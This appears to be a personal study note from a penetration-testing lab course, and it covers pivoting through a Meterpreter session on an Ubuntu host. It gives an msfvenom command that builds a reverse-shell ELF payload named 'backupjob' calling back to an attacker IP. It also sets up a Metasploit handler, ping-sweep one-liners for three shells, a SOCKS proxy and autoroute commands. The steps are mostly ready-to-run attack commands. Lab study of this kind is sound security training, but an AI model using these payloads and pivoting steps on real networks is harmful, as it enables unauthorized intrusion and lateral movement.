### **Meterpreter Pivot (No SSH Required)**

When you have a Meterpreter shell on a Ubuntu pivot host, you can create a pivot directly through the session — no SSH port forwarding needed. Use a Meterpreter shell command to get a reverse shell back on your attack host (e.g., port `8080`), then run enumeration scans through it.

#### Creating Payload for Ubuntu Pivot Host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### Configuring & Starting the multi/handler
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
run
```

![[Pasted image 20260317184917.png]]

#### Executing the Payload on the Pivot Host
![[Pasted image 20260317185213.png]]

![[Pasted image 20260317185459.png]]
#### Ping Sweep
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```bash
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

> Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

>Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.'

#### Configuring MSF's SOCKS Proxy

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

#### Confirming Proxy Server is Running
![[Pasted image 20260317190443.png]]

**Make sure that the proxychains.conf file has the below line**
![[Pasted image 20260317190643.png]]

> Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

#### Creating Routes with AutoRoute
```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```
![[Pasted image 20260317191159.png]]

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```
meterpreter > run autoroute -s 172.16.5.0/23
```

![[Pasted image 20260317191443.png]]
